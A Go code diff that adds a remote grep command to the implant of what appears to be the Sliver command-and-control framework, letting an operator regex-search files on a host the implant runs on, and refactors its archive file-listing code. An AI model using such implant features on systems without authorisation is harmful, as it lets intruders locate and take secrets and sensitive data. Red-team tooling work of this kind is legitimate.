@@ -30,8 +30,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
+	"unicode/utf8"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -535,6 +537,221 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func searchFileForPattern(searchPath string, searchPattern *regexp.Regexp, linesBeforeCount int, linesAfterCount int) ([]*sliverpb.GrepResult, bool, error) {
+	var results []*sliverpb.GrepResult
+
+	fileHandle, err := os.Open(searchPath)
+	if err != nil {
+		return nil, false, err
+	}
+	defer fileHandle.Close()
+
+	fileScanner := bufio.NewScanner(fileHandle)
+	var linePosition int64 = 1
+	var linesBefore []string
+	var linesAfter []string
+	// A slice containing the line numbers that we need to capture lines up to
+	var linePositionsAfter []int64
+	var resultIndex int = 0
+	binaryFile := false
+	textLine := false
+
+	for fileScanner.Scan() {
+		line := fileScanner.Text()
+		// If the line is not valid UTF-8, then the file contains binary
+		// We do not want to send binary data back to the client
+		textLine = utf8.ValidString(line)
+		if !textLine {
+			binaryFile = true
+			// Disable before and after line counts
+			linesBeforeCount = 0
+			linesAfterCount = 0
+		}
+
+		if linesBeforeCount > 0 && !binaryFile {
+			linesBefore = append(linesBefore, line)
+			if len(linesBefore) > int(linesBeforeCount)+1 {
+				linesBefore = linesBefore[1:]
+			}
+		}
+
+		if linesAfterCount > 0 && len(linePositionsAfter) > 0 && !binaryFile {
+			if linePosition <= linePositionsAfter[0] {
+				linesAfter = append(linesAfter, line)
+				if len(linesAfter) > linesAfterCount {
+					linesAfter = linesAfter[1:]
+				}
+			} else {
+				results[resultIndex].LinesAfter = make([]string, len(linesAfter))
+				copy(results[resultIndex].LinesAfter, linesAfter)
+				if len(linePositionsAfter) > 1 {
+					linesAfter = linesAfter[linePositionsAfter[1]-linePositionsAfter[0]:]
+				} else {
+					linesAfter = linesAfter[1:]
+				}
+				linePositionsAfter = linePositionsAfter[1:]
+				resultIndex += 1
+				linesAfter = append(linesAfter, line)
+			}
+		}
+
+		if matches := searchPattern.FindAllStringIndex(line, -1); matches != nil {
+			if !textLine {
+				results = append(results, &sliverpb.GrepResult{LineNumber: linePosition})
+			} else {
+				var positions []*sliverpb.GrepLinePosition
+				for _, match := range matches {
+					positions = append(positions, &sliverpb.GrepLinePosition{Start: int32(match[0]), End: int32(match[1])})
+				}
+				if linesBeforeCount > 0 && len(linesBefore) > 0 {
+					results = append(results, &sliverpb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: linesBefore[:len(linesBefore)-1]})
+				} else {
+					results = append(results, &sliverpb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: []string{}})
+				}
+				if linesAfterCount > 0 {
+					linePositionsAfter = append(linePositionsAfter, linePosition+int64(linesAfterCount))
+				}
+			}
+		}
+		linePosition += 1
+	}
+
+	// We reached the end of the file, but we need to make sure we capture any lines that might be queued up
+	if linesAfterCount > 0 && len(linePositionsAfter) > 0 && !binaryFile {
+		for idx, afterLinePosition := range linePositionsAfter {
+			sliceStopPosition := len(linesAfter)
+			if len(linesAfter) >= linesAfterCount {
+				sliceStopPosition = linesAfterCount
+			}
+			results[resultIndex].LinesAfter = make([]string, len(linesAfter[:sliceStopPosition]))
+			copy(results[resultIndex].LinesAfter, linesAfter[:sliceStopPosition])
+			if idx != len(linePositionsAfter)-1 {
+				nextPosition := linePositionsAfter[idx+1]
+				linesAfter = linesAfter[nextPosition-afterLinePosition:]
+			}
+			resultIndex += 1
+		}
+	}
+
+	return results, binaryFile, nil
+}
+
+func searchPathForPattern(searchPath string, filter string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*sliverpb.GrepResultsForFile, error) {
+	var results map[string]*sliverpb.GrepResultsForFile = make(map[string]*sliverpb.GrepResultsForFile)
+
+	fileList, err := buildFileList(searchPath, filter, recursive)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, file := range fileList {
+		fi, err := os.Stat(file)
+		if err != nil {
+			// Cannot get info on the file, so skip it
+			continue
+		}
+
+		// If the file is a symlink replace fileInfo and path with the symlink destination.
+		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
+			file, err = filepath.EvalSymlinks(file)
+			if err != nil {
+				continue
+			}
+		}
+
+		// Do the grep
+		fileResults, binaryFile, err := searchFileForPattern(file, searchPattern, linesBefore, linesAfter)
+
+		if err != nil {
+			// The error for this file will go back in the results
+			result := &sliverpb.GrepResult{LineNumber: -1, Positions: nil, Line: err.Error()}
+			results[file] = &sliverpb.GrepResultsForFile{FileResults: []*sliverpb.GrepResult{result}, IsBinary: binaryFile}
+			continue
+		} else {
+			results[file] = &sliverpb.GrepResultsForFile{FileResults: fileResults, IsBinary: binaryFile}
+		}
+	}
+
+	return results, nil
+}
+
+func performGrep(searchPath string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*sliverpb.GrepResultsForFile, error) {
+	var results map[string]*sliverpb.GrepResultsForFile
+
+	target, _ := filepath.Abs(searchPath)
+
+	fileInfo, err := os.Stat(target)
+	if err == nil && !fileInfo.IsDir() {
+		// Then this is a single file
+		result, binaryFile, err := searchFileForPattern(target, searchPattern, linesBefore, linesAfter)
+		if err != nil {
+			return nil, err
+		}
+		results = make(map[string]*sliverpb.GrepResultsForFile)
+		results[target] = &sliverpb.GrepResultsForFile{FileResults: result, IsBinary: binaryFile}
+		return results, nil
+	} else if err == nil && fileInfo.IsDir() {
+		if fileInfo.IsDir() {
+			// Even if the implant is running on Windows, Go can deal with "/" as a path separator
+			target += "/"
+		}
+	}
+	/*
+		The search path might not exist or be accessible,
+		but we will determine that when we try to do the search
+	*/
+
+	path, filter := determineDirPathFilter(target)
+
+	results, err = searchPathForPattern(path, filter, searchPattern, recursive, linesBefore, linesAfter)
+
+	return results, err
+}
+
+func grepHandler(data []byte, resp RPCResponse) {
+	grepReq := &sliverpb.GrepReq{}
+	err := proto.Unmarshal(data, grepReq)
+
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		resp([]byte{}, err)
+		return
+	}
+
+	grep := &sliverpb.Grep{Results: nil}
+
+	// Sanity check the request (does the regex compile?)
+	searchRegex, err := regexp.Compile(grepReq.SearchPattern)
+	if err != nil {
+		// There is something wrong with the supplied regex
+		// {{if .Config.Debug}}
+		log.Printf("error getting parsing the search pattern: %v", err)
+		// {{end}}
+		grep.Response = &commonpb.Response{
+			Err: fmt.Sprintf("There was a problem with the supplied search pattern: %v", err),
+		}
+
+		data, _ = proto.Marshal(grep)
+		resp(data, err)
+		return
+	}
+
+	grep.Results, err = performGrep(grepReq.Path, searchRegex, grepReq.Recursive, int(grepReq.LinesBefore), int(grepReq.LinesAfter))
+	grep.SearchPathAbsolute, _ = filepath.Abs(grepReq.Path)
+	if err == nil {
+		grep.Response = &commonpb.Response{}
+	} else {
+		grep.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	}
+
+	data, _ = proto.Marshal(grep)
+	resp(data, err)
+}
+
 func uploadHandler(data []byte, resp RPCResponse) {
 	uploadReq := &sliverpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
@@ -882,38 +1099,10 @@ func standarizeArchiveFileName(path string) string {
 	}
 }
 
-func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, int, error) {
-	zipWriter := gzip.NewWriter(buf)
-	tarWriter := tar.NewWriter(zipWriter)
-	readFiles := 0
-	unreadableFiles := 0
+func buildFileList(path string, filter string, recurse bool) ([]string, error) {
 	var matchingFiles []string
-
 	/*
-		There is an edge case where if you are trying to download a junction on Windows,
-		you will get access denied
-
-		To resolve this, we will resolve the junction or symlink before we do anything.
-		Even though resolving the symlink first is not necessary on *nix, it does not hurt
-		and will make it so that we do not have to detect if we are on Windows.
-	*/
-	pathInfo, err := os.Lstat(path)
-	if err != nil {
-		return readFiles, unreadableFiles, err
-	}
-
-	if pathInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
-		path, err = filepath.EvalSymlinks(path)
-		if err != nil {
-			return readFiles, unreadableFiles, err
-		}
-		// The path we get back from EvalSymlinks does not have a trailing separator
-		// Forward slash is fine even on Windows.
-		path += "/"
-	}
-
-	/*
-		Build the list of files to include in the archive.
+		Build the list of files to include in the archive or to search.
 
 		Walking the directory can take a long time and do a lot of unnecessary work
 		if we do not need to recurse through subdirectories.
@@ -925,12 +1114,12 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 		testPath := strings.ReplaceAll(path, "\\", "/")
 		directory, err := os.Open(path)
 		if err != nil {
-			return readFiles, unreadableFiles, err
+			return nil, err
 		}
 		directoryFiles, err := directory.Readdirnames(0)
 		directory.Close()
 		if err != nil {
-			return readFiles, unreadableFiles, err
+			return nil, err
 		}
 
 		for _, fileName := range directoryFiles {
@@ -961,6 +1150,44 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 			}
 			return nil
 		})
+	}
+
+	return matchingFiles, nil
+}
+
+func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, int, error) {
+	zipWriter := gzip.NewWriter(buf)
+	tarWriter := tar.NewWriter(zipWriter)
+	readFiles := 0
+	unreadableFiles := 0
+	var matchingFiles []string
+
+	/*
+		There is an edge case where if you are trying to download a junction on Windows,
+		you will get access denied
+
+		To resolve this, we will resolve the junction or symlink before we do anything.
+		Even though resolving the symlink first is not necessary on *nix, it does not hurt
+		and will make it so that we do not have to detect if we are on Windows.
+	*/
+	pathInfo, err := os.Lstat(path)
+	if err != nil {
+		return readFiles, unreadableFiles, err
+	}
+
+	if pathInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+		path, err = filepath.EvalSymlinks(path)
+		if err != nil {
+			return readFiles, unreadableFiles, err
+		}
+		// The path we get back from EvalSymlinks does not have a trailing separator
+		// Forward slash is fine even on Windows.
+		path += "/"
+	}
+
+	matchingFiles, err = buildFileList(path, filter, recurse)
+	if err != nil {
+		return readFiles, unreadableFiles, err
 	}
 
 	for _, file := range matchingFiles {
